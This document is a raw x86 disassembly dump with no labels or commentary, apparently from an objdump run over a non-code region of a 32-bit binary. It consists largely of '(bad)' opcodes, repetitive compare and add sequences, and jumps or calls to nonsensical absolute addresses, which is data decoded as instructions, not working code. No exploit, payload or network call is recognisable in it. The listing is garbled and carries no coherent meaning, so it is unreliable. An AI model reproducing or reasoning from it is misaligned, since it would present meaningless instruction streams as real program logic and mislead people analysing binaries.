  4180c9:	std    
  4180ca:	(bad)  
  4180cb:	call   DWORD PTR [eax]
  4180cd:	std    
  4180ce:	(bad)  
  4180cf:	call   DWORD PTR [eax]
  4180d1:	std    
  4180d2:	(bad)  
  4180d3:	jmp    eax
  4180d5:	cld    
  4180d6:	(bad)  
  4180d7:	inc    DWORD PTR [eax]
	...
  4180e9:	add    BYTE PTR [eax],al
  4180eb:	add    al,ah
  4180ed:	cld    
  4180ee:	(bad)  
  4180ef:	call   eax
  4180f1:	cld    
  4180f2:	(bad)  
  4180f3:	call   eax
  4180f5:	cld    
  4180f6:	(bad)  
  4180f7:	jmp    eax
  4180f9:	cld    
  4180fa:	(bad)  
  4180fb:	jmp    eax
  4180fd:	cld    
  4180fe:	(bad)  
  4180ff:	call   eax
  418101:	cld    
  418102:	(bad)  
  418103:	call   eax
  418105:	cld    
  418106:	(bad)  
  418107:	jmp    DWORD PTR [eax-0x5f000004]
  41810d:	cld    
  41810e:	(bad)  
  41810f:	call   DWORD PTR [eax-0x6f000004]
  418115:	cld    
  418116:	(bad)  
  418117:	jmp    DWORD PTR [eax-0x5f000004]
  41811d:	cld    
  41811e:	(bad)  
  41811f:	call   DWORD PTR [eax-0x6f000004]
  418125:	cld    
  418126:	(bad)  
  418127:	jmp    DWORD PTR [eax-0x4]
  41812a:	(bad)  
  41812b:	jmp    DWORD PTR [eax-0x4]
  41812e:	(bad)  
  41812f:	call   DWORD PTR [eax-0x4]
  418132:	(bad)  
  418133:	call   DWORD PTR [eax-0x4]
  418136:	(bad)  
  418137:	jmp    DWORD PTR [eax-0x4]
  41813a:	(bad)  
  41813b:	(bad)  
  41813c:	cmp    DWORD PTR [edi-0x58c6ffff],esp
  418142:	add    DWORD PTR [eax],eax
  418144:	cmp    DWORD PTR [edi-0x56c6ffff],esp
  41814a:	add    DWORD PTR [eax],eax
  41814c:	cmp    DWORD PTR [ecx+0x1],ebp
	...
  418162:	add    BYTE PTR [eax],al
  418164:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  41816a:	add    DWORD PTR [eax],eax
  41816c:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  418172:	add    DWORD PTR [eax],eax
  418174:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  41817a:	add    DWORD PTR [eax],eax
  41817c:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  418182:	add    DWORD PTR [eax],eax
  418184:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  41818a:	add    DWORD PTR [eax],eax
  41818c:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  418192:	add    DWORD PTR [eax],eax
  418194:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  41819a:	add    DWORD PTR [eax],eax
  41819c:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  4181a2:	add    DWORD PTR [eax],eax
  4181a4:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  4181aa:	add    DWORD PTR [eax],eax
  4181ac:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  4181b2:	add    DWORD PTR [eax],eax
  4181b4:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  4181ba:	add    DWORD PTR [eax],eax
  4181bc:	cmp    DWORD PTR [ecx-0x56c6ffff],ebp
  4181c2:	add    DWORD PTR [eax],eax
  4181c4:	cmp    DWORD PTR [ecx+0x1],ebp
	...
  4181da:	add    BYTE PTR [eax],al
  4181dc:	cmp    DWORD PTR [eax],eax
  4181de:	out    0x3,eax
  4181e0:	cmp    DWORD PTR [eax],eax
  4181e2:	out    0x3,eax
  4181e4:	cmp    DWORD PTR [eax],eax
  4181e6:	call   0x60607dd1
  4181eb:	outs   dx,DWORD PTR ds:[esi]
  4181ec:	jb     0x418195
  4181ee:	test   DWORD PTR [eax+0x2ff577f3],edi
  4181f4:	imul   esi,eax,0x5f
  4181f7:	outs   dx,DWORD PTR ds:[esi]
  4181f8:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181fa:	call   0x6760fde5
  4181ff:	add    al,0x79
  418201:	add    BYTE PTR [edi],al
  418203:	add    al,0x29
  418205:	add    bh,bl
  418207:	add    edi,DWORD PTR ds:0xfe03e900
  41820d:	xchg   esi,eax
  41820e:	out    0x3,eax
  418210:	mov    ecx,0x7903e6ff
  418215:	add    bh,ah
  418217:	add    ebx,DWORD PTR [ecx]
  418219:	add    bh,ah
  41821b:	add    ecx,DWORD PTR [ecx+0x0]
  41821e:	out    0x3,eax
  418220:	inc    ecx
  418221:	add    bh,ah
  418223:	add    esi,DWORD PTR ds:0x3b03e700
  418229:	add    bh,ah
  41822b:	add    edi,DWORD PTR [esi+0x3983e796]
  418231:	add    bh,ah
  418233:	inc    ebx
  418234:	cmp    DWORD PTR [eax],eax
  418236:	out    0xe3,eax
  418238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418239:	xchg   esi,eax
  41823a:	out    0xf3,eax
  41823c:	sahf   
  41823d:	xchg   esi,eax
  41823e:	out    0xb,eax
	...
  418254:	cmp    DWORD PTR [eax],eax
  418256:	out    0xff,eax
  418258:	mov    ss,WORD PTR [esi+0x3905e7]
  41825e:	out    0x4,eax
  418260:	cmp    DWORD PTR [eax],eax
  418262:	add    edi,DWORD PTR [bx+di]
  418265:	add    BYTE PTR [edi],ah
  418267:	add    al,0x39
  418269:	add    BYTE PTR [eax],al
  41826b:	or     DWORD PTR ds:0x3ad90000,edi
  418271:	add    BYTE PTR [eax],al
  418273:	icebp  
  418274:	cmp    al,BYTE PTR [eax]
  418276:	add    ch,ah
  418278:	cmp    al,BYTE PTR [eax]
  41827a:	add    bl,ch
  41827c:	cmp    al,BYTE PTR [eax]
  41827e:	add    al,ch
  418280:	cmp    al,BYTE PTR [eax]
  418282:	add    cl,al
  418284:	or     bl,dh
  418286:	pop    ds
  418287:	loope  0x4182b3
  418289:	(bad)  
  41828a:	jmp    FWORD PTR [edi-0x2fe120f3]
  418290:	and    eax,0xef22feff
  418295:	out    0x21,eax
  418297:	add    eax,DWORD PTR [edi]
  418299:	or     BYTE PTR [edx],al
  41829b:	adc    ch,dh
  41829d:	call   0xe42c91c2
  4182a2:	and    eax,0x603e8e7
  4182a7:	cld    
  4182a8:	or     ebx,ebp
  4182aa:	and    dl,ah
  4182ac:	jmp    0xef2e85bb
  4182b1:	jmp    0xa0a87d9
  4182b6:	add    al,0x2
	...
  4182cc:	(bad)  
  4182cd:	or     BYTE PTR [ecx],al
  4182cf:	call   0xe1477f10
  4182d4:	sub    al,0x4
  4182d6:	push   cs
  4182d7:	imul   BYTE PTR [ebp-0x5229ed10]
  4182dd:	clc    
  4182de:	sbb    esp,esp
  4182e0:	stos   BYTE PTR es:[edi],al
  4182e1:	pop    es
  4182e2:	adc    eax,0x18ff9ee9
  4182e7:	not    DWORD PTR [edi-0x7b08f90f]
  4182ed:	or     BYTE PTR [ecx],al
  4182ef:	lock cmp DWORD PTR [ebx],eax
  4182f2:	push   es
  4182f3:	repz test DWORD PTR [ecx],ecx
  4182f6:	(bad)  
  4182f7:	dec    DWORD PTR [eax-0x55]
  4182fa:	sbb    esp,DWORD PTR [esi+edi*1]
  4182fd:	mov    dl,0x1a
  4182ff:	daa    
  418300:	bound  ebx,QWORD PTR [ebp-0x53c4d0e3]
  418306:	and    esi,DWORD PTR [edi]
  418308:	add    ebp,0x9c71292a
  41830e:	sbb    DWORD PTR [edi],ebx
  418310:	push   eax
  418311:	xchg   ebp,eax
  418312:	inc    BYTE PTR [eax]
  418314:	push   eax
  418315:	add    DWORD PTR [eax],eax
  418317:	add    BYTE PTR [eax],ah
  418319:	add    ebp,edi
  41831b:	call   DWORD PTR [edx*4+0x11400fe]
  418322:	std    
  418323:	add    BYTE PTR [edx*4+0x124fffe],dl
  41832a:	add    BYTE PTR [eax],al
  41832c:	and    BYTE PTR [ecx],al
  41832e:	std    
  41832f:	inc    DWORD PTR [eax]
	...
  418341:	add    BYTE PTR [eax],al
  418343:	add    BYTE PTR [eax],dl
  418345:	xchg   ebp,eax
  418346:	std    
  418347:	call   DWORD PTR [eax]
  418349:	xchg   ebp,eax
  41834a:	inc    BYTE PTR [eax]
  41834c:	in     al,0x94
  41834e:	inc    BYTE PTR [eax]
  418350:	loopne 0x4182e6
  418352:	std    
  418353:	call   esp
  418355:	xchg   esp,eax
  418356:	std    
  418357:	add    ah,dl
  418359:	add    ch,bh
  41835b:	add    al,ah
  41835d:	add    BYTE PTR [eax],al
  41835f:	add    esp,edx
  418361:	add    BYTE PTR [eax],al
  418363:	add    ah,dl
  418365:	xchg   esp,eax
  418366:	std    
  418367:	call   eax
  418369:	xchg   esp,eax
  41836a:	std    
  41836b:	add    BYTE PTR [eax-0x5fff026c],ah
  418371:	xchg   esp,eax
  418372:	(bad)  
  418373:	call   DWORD PTR [eax-0x6f00016c]
  418379:	add    ch,bh
  41837b:	add    BYTE PTR [eax-0x6bff0300],ah
  418381:	xchg   esp,eax
  418382:	std    
  418383:	add    BYTE PTR [ecx],bh
  418385:	mov    ds:0x9a7eff01,eax
  41838a:	add    DWORD PTR [eax],eax
  41838c:	cmp    BYTE PTR [ebx-0x64c7ffff],ah
  418392:	add    edi,edi
  418394:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418396:	add    DWORD PTR [eax],eax
  418398:	cmp    DWORD PTR [ebx-0x5da90003],ebx
  41839e:	std    
  41839f:	dec    BYTE PTR [esi-0x5a]
  4183a2:	add    DWORD PTR [eax],eax
  4183a4:	cmp    BYTE PTR [edi+0xff01],ah
	...
  4183ba:	add    BYTE PTR [eax],al
  4183bc:	ds call 0x1:0xa539fefd
  4183c4:	cmp    DWORD PTR [ecx-0x56c600ff],ebp
  4183ca:	std    
  4183cb:	(bad)  
  4183cc:	cmp    DWORD PTR [ecx-0x56c7ffff],ebp
  4183d2:	add    DWORD PTR [eax],eax
  4183d4:	cmp    BYTE PTR [ecx-0x59f90003],ch
  4183da:	add    edi,edi
  4183dc:	cmp    DWORD PTR [ecx-0x560900ff],ebp
  4183e2:	std    
  4183e3:	(bad)  
  4183e4:	out    dx,al
  4183e5:	popf   
  4183e6:	add    DWORD PTR [eax],eax
  4183e8:	cmp    BYTE PTR [ecx-0x62210003],ch
  4183ee:	add    DWORD PTR [eax],eax
  4183f0:	cmp    DWORD PTR [ebp-0x62c60003],esp
  4183f6:	std    
  4183f7:	inc    dh
  4183f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183fa:	std    
  4183fb:	(bad)  
  4183fc:	cmp    DWORD PTR [ebp-0x564900ff],ebx
  418402:	add    edi,edi
  418404:	cmp    DWORD PTR [ebp-0x5ac60003],ebx
  41840a:	add    DWORD PTR [eax],eax
  41840c:	cmp    BYTE PTR [ebp+0x96fffd],bl
  418412:	jmp    0x418413
  418414:	(bad)  
  418415:	xchg   ebx,eax
  418416:	out    0xff,eax
  418418:	xchg   DWORD PTR [eax],eax
  41841a:	jmp    0x41841b
  41841c:	jle    0x4183b1
  41841e:	out    0xff,eax
	...
  418434:	jbe    0x418436
  418436:	out    0xff,eax
  418438:	outs   dx,BYTE PTR ds:[esi]
  418439:	add    bh,ah
  41843b:	add    edi,DWORD PTR [ecx]
  41843d:	add    bl,ch
  41843f:	add    ebx,DWORD PTR [esi-0x6d]
  418442:	out    0xff,eax
  418444:	push   edi
  418445:	xchg   ebx,eax
  418446:	out    0x3,eax
  418448:	cmp    DWORD PTR [eax],eax
  41844a:	jecxz  0x41844f
  41844c:	inc    esi
  41844d:	add    bh,al
  41844f:	sub    DWORD PTR [ecx],0xffffff80
  418452:	out    0x83,eax
  418454:	cmp    DWORD PTR [eax+0x3983e7],eax
  41845a:	mov    DWORD PTR [ebx+0x3e70049],0x3c70049
  418464:	cmp    DWORD PTR [eax],eax
  418466:	pop    es
  418467:	add    al,0x29
  418469:	add    BYTE PTR [edi],0x84
  41846c:	cmp    DWORD PTR [eax-0x7fc6fbf9],eax
  418472:	pop    es
  418473:	test   BYTE PTR [ecx-0x80],cl
  418476:	out    0x83,eax
  418478:	dec    ecx
  418479:	and    bh,0x3
  41847c:	cmp    DWORD PTR [eax-0x7fc67c19],eax
  418482:	out    0x3,eax
  418484:	sub    DWORD PTR [eax],eax
  418486:	mov    DWORD PTR [ebx],0x3c70039
  41848c:	sub    DWORD PTR [eax+0x2983e7],eax
  418492:	mov    DWORD PTR [ebx],0x83c70049
	...
  4184ac:	cmp    DWORD PTR [eax+0x3903e7],eax
  4184b2:	add    cl,ch
  4184b4:	cmp    al,BYTE PTR [eax]
  4184b6:	sub    cl,0xba
  4184b9:	(bad)  
  4184ba:	dec    DWORD PTR [eax]
  4184bc:	mov    ch,0xef
  4184be:	(bad)  
  4184bf:	call   0x9c174fe
  4184c4:	xor    eax,0x3d08fff0
  4184c9:	add    BYTE PTR [eax+0x3ae9],al
  4184cf:	jmp    0x941748e
  4184d4:	mov    ch,0xff
  4184d6:	(bad)  
  4184d7:	call   0xe9c17496
  4184dc:	cmp    dh,al
  4184de:	jg     0x4184a9
  4184e0:	mov    edx,0x3ae8ffff
  4184e5:	add    BYTE PTR [eax],al
  4184e7:	leave  
  4184e8:	mov    edx,0x3ac8fff0
  4184ed:	lock jg 0x4184d9
  4184f0:	cmp    dh,al
  4184f2:	dec    eax
  4184f4:	mov    edx,0x3ae98000
  4184f9:	lock jg 0x4184e5
  4184fc:	mov    edx,0xbae97ff0
  418501:	add    BYTE PTR [eax],al
  418503:	jmp    0xe9c17542
  418508:	mov    edx,0x35098000
  41850d:	add    BYTE PTR [eax],al
  41850f:	or     DWORD PTR [eax],eax
	...
  418521:	add    BYTE PTR [eax],al
  418523:	add    BYTE PTR [ebp-0x4af68010],bh
  418529:	lock dec DWORD PTR [eax]
  41852c:	cmp    eax,0xbae90000
  418531:	add    BYTE PTR [eax],al
  418533:	jmp    0xc9c18572
  418538:	mov    edx,0xbae90000
  41853d:	lock jg 0x418540
  418540:	mov    al,ds:0x70000ffd
  418545:	std    
  418546:	(bad)  
  418547:	jg     0x4185b9
  418549:	std    
  41854a:	sldt   WORD PTR [eax+0x4080007d]
  418551:	cld    
  418552:	(bad)  
  418553:	jg     0x418585
  418555:	cld    
  418556:	lldt   WORD PTR [eax+0x6000107d]
  41855d:	std    
  41855e:	(bad)  
  41855f:	jmp    DWORD PTR [eax+0x7d]
  418562:	add    BYTE PTR [eax+0x7c30],al
  418568:	push   eax
  418569:	std    
  41856a:	(bad)  
  41856b:	jg     0x4185ad
  41856d:	cld    
  41856e:	jo     0x805202f4
  418574:	push   eax
  418575:	jge    0x418587
  418577:	add    BYTE PTR [eax-0x1],bl
  41857a:	(bad)  
  41857b:	jmp    DWORD PTR [eax]
  41857d:	inc    DWORD PTR [ecx]
  41857f:	or     BYTE PTR [eax],ah
  418581:	std    
  418582:	(bad)  
  418583:	jmp    FWORD PTR [eax]
  418585:	std    
  418586:	add    DWORD PTR [eax],ecx
	...
  41859c:	adc    bh,bh
  41859e:	inc    DWORD PTR [edi]
  4185a0:	and    ch,bh
  4185a2:	(bad)  
  4185a3:	dec    DWORD PTR [eax]
  4185a5:	inc    DWORD PTR [ecx]
  4185a7:	add    BYTE PTR [eax],dl
  4185a9:	(bad)  
  4185aa:	inc    DWORD PTR [edi]
  4185ac:	sbb    ch,bh
  4185ae:	add    DWORD PTR [eax],eax
  4185b0:	fdivr  st,st(4)
  4185b2:	inc    DWORD PTR [edi]
  4185b4:	call   0xd04985b5
  4185b9:	cld    
  4185ba:	add    DWORD PTR [eax],eax
  4185bc:	fdivr  st,st(6)
  4185be:	add    DWORD PTR [eax],ecx
  4185c0:	fdivr  st,st(4)
  4185c2:	add    DWORD PTR [eax],eax
  4185c4:	loopne 0x4185c2
  4185c6:	add    DWORD PTR [eax],ecx
  4185c8:	enter  0xfffe,0xff
  4185cc:	cmp    DWORD PTR [edi-0x60beffff],esp
  4185d2:	add    DWORD PTR [eax],eax
  4185d4:	cmp    DWORD PTR [edi-0x58cefe01],esp
  4185da:	(bad)  
  4185db:	(bad)  
  4185dc:	cmp    DWORD PTR [edi-0x58c6fe01],esp
  4185e2:	add    DWORD PTR [edx],eax
  4185e4:	inc    ecx
  4185e5:	pop    DWORD PTR [ecx]
  4185e7:	add    dh,BYTE PTR [ecx]
  4185e9:	(bad)  
  4185ea:	inc    DWORD PTR [ecx]
  4185ec:	cmp    DWORD PTR [edi-0x58be0001],ebx
  4185f2:	inc    DWORD PTR [ecx]
  4185f4:	cmp    DWORD PTR [edi-0x70c6fdff],esp
  4185fa:	(bad)  
  4185fb:	push   DWORD PTR [ecx]
  4185fd:	lahf   
  4185fe:	add    DWORD PTR [eax],eax
	...
  418614:	cmp    DWORD PTR [edi-0x58befe01],ebx
  41861a:	(bad)  
  41861b:	(bad)  
  41861c:	cmp    DWORD PTR [edi-0x58ceffff],esp
  418622:	inc    DWORD PTR [ecx]
  418624:	inc    ecx
  418625:	cdq    
  418626:	add    DWORD PTR [eax],eax
  418628:	inc    ecx
  418629:	xchg   ecx,eax
  41862a:	add    DWORD PTR [edx],eax
  41862c:	cmp    DWORD PTR [ecx-0x66c60001],edx
  418632:	add    DWORD PTR [edx],eax
  418634:	cmp    DWORD PTR [ecx-0x66befe01],ebx
  41863a:	(bad)  
  41863b:	push   DWORD PTR [ecx]
  41863d:	cdq    
  41863e:	add    DWORD PTR [eax],eax
  418640:	cmp    DWORD PTR [ecx-0x5ec60001],ebx
  418646:	add    DWORD PTR [edx],eax
  418648:	cmp    DWORD PTR [ecx-0x66cefe01],edx
  41864e:	(bad)  
  41864f:	push   DWORD PTR [ecx]
  418651:	mov    eax,ds:0x99410001
  418656:	(bad)  
  418657:	(bad)  
  418658:	cmp    DWORD PTR [eax],eax
  41865a:	out    0x3,eax
  41865c:	cmp    DWORD PTR [eax],eax
  41865e:	out    dx,eax
  41865f:	add    edi,DWORD PTR [ebx]
  418661:	clc    
  418662:	fiadd  WORD PTR [ecx]
  418664:	cmp    eax,edi
  418666:	out    0x3,al
  418668:	cmp    eax,DWORD PTR [eax]
  41866a:	out    0x3,eax
  41866c:	cmp    eax,edi
  41866e:	out    dx,al
  41866f:	add    DWORD PTR [ebx],edi
  418671:	clc    
  418672:	fiadd  WORD PTR [ebx]
  418674:	cmp    DWORD PTR [eax],eax
  418676:	fild   WORD PTR [ecx]
	...
  41868c:	cmp    eax,DWORD PTR [eax]
  41868e:	out    0x5,eax
  418690:	cmp    eax,DWORD PTR [eax]
  418692:	out    dx,eax
  418693:	add    edi,DWORD PTR [ecx]
  418695:	clc    
  418696:	out    0x3,al
  418698:	cmp    edi,eax
  41869a:	fiadd  WORD PTR ds:0x5eef839
  4186a0:	cmp    DWORD PTR [eax],eax
  4186a2:	out    0x3,eax
  4186a4:	cmp    edi,eax
  4186a6:	fiadd  WORD PTR ds:0x3df003b
  4186ac:	cmp    DWORD PTR [eax],eax
  4186ae:	out    dx,eax
  4186af:	add    edi,DWORD PTR [ebx]
  4186b1:	clc    
  4186b2:	out    0x5,al
  4186b4:	cmp    eax,DWORD PTR [eax]
  4186b6:	call   0x68423d9e
  4186bb:	in     al,0x2e
  4186bd:	(bad)
  4186c1:	(bad)  
  4186c2:	addr16 add al,0x39
  4186c5:	add    BYTE PTR [edi-0x1c],ah
  4186c8:	xchg   esi,eax
  4186c9:	add    BYTE PTR [eax+0x4],ch
  4186cc:	mov    ecx,0xb903e7ff
  4186d1:	jmp    edi
  4186d3:	jecxz  0x4186d3
  4186d5:	mov    fs,edi
  4186d7:	add    edi,DWORD PTR [ecx]
  4186d9:	add    bh,ah
  4186db:	jecxz  0x41874b
  4186dd:	add    bh,ah
  4186df:	jecxz  0x418747
  4186e1:	add    BYTE PTR [eax-0x1c],ch
  4186e4:	pop    esi
  4186e5:	add    BYTE PTR [eax],al
  4186e7:	push   0xe900003d
  4186ec:	cmp    al,BYTE PTR [eax]
  4186ee:	add    BYTE PTR [ecx+0x0],ch
	...
  418701:	add    BYTE PTR [eax],al
  418703:	add    BYTE PTR ds:0x3ae80080,bh
  418709:	add    BYTE PTR [eax],0xe8
  41870c:	cmp    al,BYTE PTR [eax]
  41870e:	add    cl,ch
  418710:	call   0x80:0x3ae9fd8e
  418717:	call   0x694195b6
  41871c:	cmp    eax,0x3ae90000
  418721:	add    BYTE PTR [eax],0xe8
  418724:	call   0xfd8e:0x9a69fd8e
  41872b:	push   0xe800803a
  418730:	cmp    al,BYTE PTR [eax]
  418732:	add    BYTE PTR [ecx+0x5a],ch
  418735:	mov    ?,ebp
  418737:	imul   edi,DWORD PTR [edx],0x5ae90080
  41873d:	mov    ?,ebp
  41873f:	imul   ebx,DWORD PTR [edx+0xe],0xe5a6800
  418746:	add    BYTE PTR [eax+0x3a],ch
  418749:	add    BYTE PTR [eax],al
  41874b:	imul   edi,DWORD PTR [edx],0x3ae80080
  418751:	add    BYTE PTR [eax],0xe9
  418754:	sbb    cl,BYTE PTR [esi]
  418756:	add    BYTE PTR [eax+0x1a],ch
  418759:	push   cs
  41875a:	add    BYTE PTR [eax+0x3a],ch
  41875d:	add    BYTE PTR [eax],al
  41875f:	jmp    0xe941879e
  418764:	cmp    al,BYTE PTR [eax]
  418766:	add    cl,ch
	...
  41877c:	sbb    cl,BYTE PTR [esi]
  41877e:	add    BYTE PTR [ecx-0x26],ch
  418781:	(bad)  
  418782:	std    
  418783:	imul   edi,DWORD PTR [edx],0x51000080
  418789:	add    DWORD PTR [eax+0x1d100],eax
  41878f:	add    cl,ah
  418791:	mov    eax,ds:0xa161007d
  418796:	std    
  418797:	call   DWORD PTR [ecx-0x5f]
  41879a:	std    
  41879b:	call   DWORD PTR [eax+0x1]
  41879e:	add    BYTE PTR [eax],al
  4187a0:	and    DWORD PTR [ecx+0x121007d],esp
  4187a6:	add    BYTE PTR [eax],al
  4187a8:	xchg   ecx,eax
  4187a9:	add    DWORD PTR [eax],eax
  4187ab:	add    BYTE PTR [eax-0x5e00025f],dl
  4187b1:	add    DWORD PTR [eax-0x25e5f00],eax
  4187b7:	call   DWORD PTR [eax]
  4187b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187ba:	jge    0x4187bc
  4187bc:	adc    DWORD PTR [eax+eax*4],eax
  4187bf:	add    BYTE PTR [ecx-0x5f],ah
  4187c2:	std    
  4187c3:	jmp    eax
  4187c5:	mov    ds:0x150fffd,eax
  4187ca:	add    BYTE PTR [eax],0x51
  4187cd:	mov    eax,ds:0x3e0007d
  4187d2:	add    BYTE PTR [eax],al
  4187d4:	pusha  
  4187d5:	add    DWORD PTR [eax-0x25eb000],eax
  4187db:	call   eax
  4187dd:	mov    ds:0x7d,eax
	...
  4187f2:	add    BYTE PTR [eax],al
  4187f4:	and    BYTE PTR [edx],al
  4187f6:	add    BYTE PTR [eax],al
  4187f8:	and    BYTE PTR [edx],al
  4187fa:	or     BYTE PTR [edx],al
  4187fc:	adc    BYTE PTR [ecx],al
  4187fe:	or     BYTE PTR [edx],al
  418800:	adc    BYTE PTR [edx],al
  418802:	add    BYTE PTR [edx+0x20],al
  418805:	add    DWORD PTR [eax],ecx
  418807:	add    BYTE PTR [eax],ah
  418809:	add    al,BYTE PTR [eax]
  41880b:	add    BYTE PTR [eax],dl
  41880d:	add    DWORD PTR [eax],eax
  41880f:	inc    eax
  418810:	adc    BYTE PTR [ecx],al
  418812:	or     BYTE PTR [edx],al
  418814:	cmp    DWORD PTR [edi-0x6886f7fe],edx
  41881a:	add    DWORD PTR [eax],ecx
  41881c:	cmp    DWORD PTR [edi-0x68c4fffe],edx
  418822:	add    cl,BYTE PTR [eax]
  418824:	jns    0x4187bd
  418826:	add    al,BYTE PTR [eax]
  418828:	jnp    0x4187c1
  41882a:	add    DWORD PTR [eax],ecx
  41882c:	jnp    0x4187c5
  41882e:	add    cl,BYTE PTR [eax]
  418830:	cmp    DWORD PTR [edi-0x6906ffff],edx
  418836:	add    DWORD PTR [eax],eax
  418838:	cmp    edx,DWORD PTR [edi-0x6906f7ff]
  41883e:	add    DWORD PTR [eax],ecx
  418840:	stc    
  418841:	xchg   esi,eax
  418842:	add    DWORD PTR [eax],eax
  418844:	cmp    DWORD PTR [edi-0x6906fffe],edx
  41884a:	add    cl,BYTE PTR [eax]
  41884c:	sti    
  41884d:	xchg   esi,eax
  41884e:	add    cl,BYTE PTR [eax]
  418850:	sti    
  418851:	xchg   esi,eax
  418852:	add    al,BYTE PTR [eax]
  418854:	cmp    edx,DWORD PTR [edi+0x801]
	...
  41886a:	add    BYTE PTR [eax],al
  41886c:	sti    
  41886d:	xchg   esi,eax
  41886e:	add    al,BYTE PTR [eax]
  418870:	stc    
  418871:	xchg   esi,eax
  418872:	add    DWORD PTR [eax],eax
  418874:	cmp    DWORD PTR [edi-0x6904ffff],edx
  41887a:	add    cl,BYTE PTR [eax]
  41887c:	cmp    edx,DWORD PTR [edi-0x68c4ffff]
  418882:	add    DWORD PTR [eax],eax
  418884:	sti    
  418885:	xchg   esi,eax
  418886:	add    cl,BYTE PTR [eax]
  418888:	cmp    DWORD PTR [ecx-0x66c6f7ff],ebx
  41888e:	add    al,BYTE PTR [eax]
  418890:	jnp    0x41882b
  418892:	add    al,BYTE PTR [eax]
  418894:	cmp    DWORD PTR [ecx-0x66c4ffff],ebx
  41889a:	add    DWORD PTR [eax],eax
  41889c:	jns    0x418837
  41889e:	add    DWORD PTR [eax],ecx
  4188a0:	cmp    eax,DWORD PTR [eax]
  4188a2:	out    0x2,eax
  4188a4:	cmp    DWORD PTR [esi],edi
  4188a6:	out    0x2,eax
  4188a8:	inc    ecx
  4188a9:	inc    eax
  4188aa:	out    0x2,eax
  4188ac:	cmp    esi,edi
  4188ae:	out    0x3,al
  4188b0:	cmp    DWORD PTR [eax-0x19],eax
  4188b3:	add    esi,DWORD PTR [ecx]
  4188b5:	ds out 0x2,eax
  4188b8:	inc    ecx
  4188b9:	(bad)  
  4188ba:	out    0x2,al
  4188bc:	inc    ecx
  4188bd:	inc    eax
  4188be:	out    0x2,eax
  4188c0:	cmp    DWORD PTR [eax],eax
  4188c2:	out    0x3,eax
  4188c4:	cmp    esi,edi
  4188c6:	out    0x3,al
  4188c8:	inc    ecx
  4188c9:	ds out 0x2,eax
  4188cc:	inc    ecx
  4188cd:	ds out 0x2,eax
	...
  4188e4:	xor    DWORD PTR [eax],eax
  4188e6:	out    0x3,eax
  4188e8:	cmp    DWORD PTR [esi],edi
  4188ea:	out    0x2,eax
  4188ec:	inc    ecx
  4188ed:	ds out 0x3,eax
  4188f0:	inc    ecx
  4188f1:	(bad)  
  4188f2:	out    0x3,al
  4188f4:	cmp    DWORD PTR [eax],eax
  4188f6:	out    0x3,eax
  4188f8:	xor    DWORD PTR [eax-0x19],eax
  4188fb:	add    edi,DWORD PTR [ecx]
  4188fd:	ds out 0x4,eax
  418900:	inc    ecx
  418901:	add    bh,ah
  418903:	add    al,0x39
  418905:	(bad)  
  418906:	out    0x4,al
  418908:	cmp    DWORD PTR [eax-0x19],eax
  41890b:	add    eax,DWORD PTR [ecx+0x0]
  41890e:	out    0x3,eax
  418910:	cmp    DWORD PTR [eax],eax
  418912:	out    0x3,eax
  418914:	xor    DWORD PTR [eax-0x19],eax
  418917:	add    al,0x31
  418919:	(bad)  
  41891a:	out    0x4,al
  41891c:	cmp    DWORD PTR [eax-0x9],eax
  41891f:	add    edi,DWORD PTR [ecx]
  418921:	loopne 0x418909
  418923:	add    edi,DWORD PTR [ecx-0x20]
  418926:	out    0x43,al
  418928:	cmp    DWORD PTR [eax],eax
  41892a:	xlat   BYTE PTR ds:[ebx]
  41892b:	inc    ebx
  41892c:	jns    0x41890e
  41892e:	(bad)  
  41892f:	call   0xd961c96e
  418934:	cmp    al,BYTE PTR [eax]
  418936:	add    cl,bh
  418938:	jp     0x41897a
  41893a:	and    cl,ch
  41893c:	cmp    al,BYTE PTR [eax+0x0]
  41893f:	jmp    0xf96189be
  418944:	jp     0x418986
  418946:	add    cl,ch
	...
  41895c:	cmp    al,BYTE PTR [eax+0x0]
  41895f:	fnstcw WORD PTR [edx]
  418961:	add    BYTE PTR [eax],ah
  418963:	fnstcw WORD PTR [edx]
  418965:	inc    eax
  418966:	add    cl,ch
  418968:	jp     0x41896a
  41896a:	and    cl,ch
  41896c:	cmp    al,BYTE PTR [eax]
  41896e:	and    cl,bh
  418970:	cli    
  418971:	(bad)  
  418972:	(bad)  
  418973:	call   0xf94189b2
  418978:	cmp    al,BYTE PTR [eax+0x0]
  41897b:	fsqrt  
  41897d:	call   FWORD PTR [edi]
  41897f:	jmp    0xe941897e
  418984:	cli    
  418985:	aas    
  418986:	add    cl,bl
  418988:	cli    
  418989:	call   FWORD PTR [edi]
  41898b:	stc    
  41898c:	cmp    al,BYTE PTR [eax]
  41898e:	add    cl,bh
  418990:	cmp    al,BYTE PTR [eax+0x20]
  418993:	stc    
  418994:	cmp    al,BYTE PTR [eax+0x20]
  418997:	jmp    0xd94189d6
  41899c:	cli    
  41899d:	aas    
  41899e:	add    cl,ch
  4189a0:	cli    
  4189a1:	aas    
  4189a2:	and    cl,bl
  4189a4:	cli    
  4189a5:	(bad)  
  4189a6:	(bad)  
  4189a7:	call   0xe941c9a6
  4189ac:	cli    
  4189ad:	aas    
  4189ae:	and    cl,ch
  4189b0:	cmp    al,BYTE PTR [eax]
  4189b2:	and    cl,ch
  4189b4:	jp     0x4189b6
  4189b6:	and    cl,bh
  4189b8:	cmp    al,BYTE PTR [eax]
  4189ba:	add    BYTE PTR [eax],al
  4189bc:	add    dh,bh
  4189be:	aas    
  4189bf:	and    BYTE PTR [eax],al
	...
  4189d1:	add    BYTE PTR [eax],al
  4189d3:	add    BYTE PTR [eax],ah
